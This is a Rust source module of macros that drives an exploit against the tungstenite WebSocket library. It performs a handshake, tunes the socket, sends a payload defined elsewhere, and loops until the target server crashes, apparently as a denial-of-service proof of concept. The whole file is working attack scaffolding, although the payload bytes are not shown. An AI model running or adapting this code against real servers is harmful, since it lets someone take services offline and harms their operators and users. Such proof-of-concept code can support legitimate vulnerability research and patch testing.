#[macro_use]
pub(crate) mod implementation {
    /// Disables Nagle's algorithm to make sure the frame reaches the server
    /// and doesn't get lingered, fragmented, or delayed.
    ///
    macro_rules! disable_nagle {
        ($stream:expr) => {
            $stream.set_nodelay(true).unwrap();
        };
    }

    /// Increases the write timeout to 10 seconds
    ///
    macro_rules! increase_write_timeout {
        ($stream:expr) => {
            $stream
                .set_write_timeout(Some(Duration::from_secs(10)))
                .unwrap();
        };
    }

    /// Waits for any of the server's messages
    ///
    macro_rules! wait_confirm {
        ($stream:expr) => {
            info!("Starting confirmation wait");

            let mut buf = [0u8; 256];

            let read_amount = $stream.read(&mut buf).unwrap_or_else(|_| {
                info!("The server is/was down!");

                exit(0)
            });

            if read_amount == 0 {
                info!("The server is/was down!");

                exit(0);
            }

            info!(
                "Confirmation completed: {:?}",
                String::from_utf8_lossy(&buf)
            );
        };
    }

    /// Performs the WebSocket handshake with the server
    /// used only with raw TCP mode
    ///
    macro_rules! perform_handshake {
        ($stream:expr) => {
            let args = Args::parse();

            info!(
                "Performing WebSocket handshake with headers
        Sec-WebSocket-Key: {}
        Host: {}:{}
        GET {} HTTP/1.1
        ",
                args.server.sec_websocket_key,
                args.server.address,
                args.server.port,
                args.server.path
            );

            let mut handshake = Handshake::from($stream.try_clone().unwrap());

            handshake.finish();
        };
    }

    /// Sends the payload to the server
    ///
    macro_rules! send_payload {
        ($stream:expr) => {
            info!("Sending payload");

            let mut payload = Payload::new($stream.try_clone().unwrap());

            payload.send();

            info!("Payload sent");
        };
    }

    /// Executes the exploit for tungstenite socket
    ///
    macro_rules! execute {
        ($stream:expr) => {
            exploit::implementation::disable_nagle!($stream);
            exploit::implementation::increase_write_timeout!($stream);
            exploit::implementation::send_payload!($stream);
            exploit::implementation::wait_for_crash!($stream);
        };
    }

    /// Waits for the connection to close
    ///
    macro_rules! wait_for_crash {
        ($stream:expr) => {
            loop {
                exploit::implementation::wait_confirm!($stream.try_clone().unwrap());

                info!("Waiting. . .");

                sleep(Duration::from_millis(500));
            }
        };
    }

    pub(crate) use disable_nagle;
    pub(crate) use execute;
    pub(crate) use increase_write_timeout;
    pub(crate) use perform_handshake;
    pub(crate) use send_payload;
    pub(crate) use wait_confirm;
    pub(crate) use wait_for_crash;
}
